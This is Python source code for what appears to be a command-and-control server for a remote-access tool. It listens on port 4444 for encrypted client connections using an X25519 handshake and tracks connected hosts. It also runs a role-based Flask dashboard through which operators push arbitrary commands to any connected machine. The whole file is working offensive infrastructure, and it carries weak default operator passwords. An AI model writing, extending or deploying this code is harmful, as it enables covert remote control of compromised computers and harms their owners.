import os, socket, threading, json, time
from flask import Flask, request, jsonify, send_from_directory
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives import serialization
from crypto_layer import derive_key, recv_exact, send_frame, recv_frame
from auth import issue_token, require_role

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 4444
WEB_HOST = "127.0.0.1"
WEB_PORT = 5000

CLIENTS = {}
CLIENTS_LOCK = threading.Lock()

OPERATORS = {
    "admin":  {"password": os.environ.get("CROCK_ADMIN_PW",  "change-me"),       "role": "admin"},
    "op1":    {"password": os.environ.get("CROCK_OP1_PW",    "change-me-too"),   "role": "operator"},
    "viewer": {"password": os.environ.get("CROCK_VIEWER_PW", "change-me-three"), "role": "viewer"},
}

app = Flask(__name__)

class Client:
    def __init__(self, conn, key, addr):
        self.conn = conn
        self.key = key
        self.addr = addr
        self.id = f"{addr[0]}:{addr[1]}"
        self.host = ""
        self.lock = threading.Lock()

    def send(self, obj):
        with self.lock:
            send_frame(self.conn, self.key, json.dumps(obj).encode())

    def recv(self):
        raw = recv_frame(self.conn, self.key)
        return json.loads(raw.decode())

def handshake(conn):
    client_pub = recv_exact(conn, 32)
    priv = X25519PrivateKey.generate()
    conn.sendall(priv.public_key().public_bytes(
        serialization.Encoding.Raw, serialization.PublicFormat.Raw
    ))
    shared = priv.exchange(X25519PublicKey.from_public_bytes(client_pub))
    return derive_key(shared)

def handle_client(conn, addr):
    try:
        key = handshake(conn)
        c = Client(conn, key, addr)
        hello = c.recv()
        c.host = hello.get("host", "")
        with CLIENTS_LOCK:
            CLIENTS[c.id] = c
        while True:
            msg = c.recv()
            if msg.get("type") == "result":
                pass
    except Exception:
        pass
    finally:
        with CLIENTS_LOCK:
            CLIENTS.pop(f"{addr[0]}:{addr[1]}", None)
        try:
            conn.close()
        except Exception:
            pass

def listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(64)
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

@app.post("/api/login")
def login():
    data = request.get_json(silent=True) or {}
    user = OPERATORS.get(data.get("username"))
    if not user or data.get("password") != user["password"]:
        return jsonify({"error": "bad credentials"}), 401
    return jsonify({"token": issue_token(data["username"], user["role"])})

@app.get("/api/clients")
@require_role("viewer")
def list_clients():
    with CLIENTS_LOCK:
        out = [{"id": c.id, "host": c.host, "addr": c.addr} for c in CLIENTS.values()]
    return jsonify({"clients": out})

@app.post("/api/command")
@require_role("operator")
def send_command():
    data = request.get_json(silent=True) or {}
    cid = data.get("client_id")
    cmd = data.get("cmd")
    if not cid or not cmd:
        return jsonify({"error": "client_id and cmd required"}), 400
    with CLIENTS_LOCK:
        c = CLIENTS.get(cid)
    if not c:
        return jsonify({"error": "client not found"}), 404
    try:
        c.send({"cmd": cmd})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    return jsonify({"ok": True})

@app.post("/api/operators")
@require_role("admin")
def add_operator():
    data = request.get_json(silent=True) or {}
    name = data.get("username")
    pw = data.get("password")
    role = data.get("role", "viewer")
    if not name or not pw or role not in ("viewer", "operator", "admin"):
        return jsonify({"error": "invalid payload"}), 400
    OPERATORS[name] = {"password": pw, "role": role}
    return jsonify({"ok": True})

@app.get("/")
def index():
    return send_from_directory(os.path.dirname(os.path.abspath(__file__)), "dashboard.html")

if __name__ == "__main__":
    threading.Thread(target=listener, daemon=True).start()
    app.run(host=WEB_HOST, port=WEB_PORT, debug=False)
